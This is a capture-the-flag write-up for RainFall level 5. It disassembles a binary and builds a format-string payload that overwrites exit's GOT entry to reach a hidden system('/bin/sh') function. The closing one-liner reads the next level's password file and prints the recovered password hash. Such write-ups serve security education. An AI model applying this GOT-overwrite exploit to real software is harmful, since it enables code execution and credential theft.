# Level 5

- Once logged in, you will see a binary `level5`

```
$ ssh level5@localhost -p 4242
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on localhost:4242
level5@localhost's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
```

Once running the binary, it does the same thing as level 4.

```
level5@RainFall:~$ ./level5
aaaaaaaaaaaa
aaaaaaaaaaaa
level5@RainFall:~$
```

Let's take a look at the assembly:

```
gdb-peda$ info functions
...
0x080484a4  o
0x080484c2  n
0x08048504  main
...
0x080485cc  _fini
```

There are three function declared in the program, so let's take a look at each.

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   ebp
   0x08048505 <+1>:	mov    ebp,esp
   0x08048507 <+3>:	and    esp,0xfffffff0
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave
   0x08048510 <+12>:	ret
End of assembler dump.
gdb-peda$
```

```
gdb-peda$ disass n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   ebp
   0x080484c3 <+1>:	mov    ebp,esp
   0x080484c5 <+3>:	sub    esp,0x218
   0x080484cb <+9>:	mov    eax,ds:0x8049848
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:	lea    eax,[ebp-0x208]
   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    eax,[ebp-0x208]
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.

gdb-peda$ x 0x8049848
0x8049848 <stdin@@GLIBC_2.0>:	0x00000000
gdb-peda$ x/s 0x80485f0
```

```
gdb-peda$ disass o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x18
   0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.
gdb-peda$

gdb-peda$ x/s 0x80485f0
0x80485f0:	 "/bin/sh"
```

By decompiling the code, we find that the function `n` is called, but unfortunately the `o` function is never called. In this exploit, we will replace the address of the call to `exit()` with the address of `o`.

We'll accomplish this by filling in the GOT (Global Offset Table) cache before it gets written.

Below is an explanation of GOT from [here](https://www.mattandreko.com/2012/02/02/exploit-exercises-protostar-format-4/):
> When the program runs for the first time, the GOT is initialized to 0x00000000 for every external function, such as libc functions. The first time it runs that function, it will cache the memory address in the GOT, so that it doesn’t have to ask libc, or the corresponding library each time. If we overwrite the GOT value, we can make it execute arbitrary code instead of that original function.

The memory address of `exit()` can be acquired by using `objdump`

```
level5@RainFall:~$ objdump -R ./level5

./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

The only thing left is to overwrite value `0x080484a4` (address of `o`) into `0x08049838` (address of exit) using a format string exploit, the same technique used by last problem.

```
Python 3.10.4 (v3.10.4:9d38120e33, Mar 23 2022, 17:29:05) [Clang 13.0.0 (clang-1300.0.29.30)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x080484a4
134513828
```

`0x80484a4` is `134513828` in decimal, which is the value that needs to be written on `0x08049838`, which is `\x38\x98\x04\x08` in little endian.

Voilà our exploit:

```
level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'; echo "cat /home/user/level6/.pass") | ./level5
[...]
                              200
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
level5@RainFall:~$
```
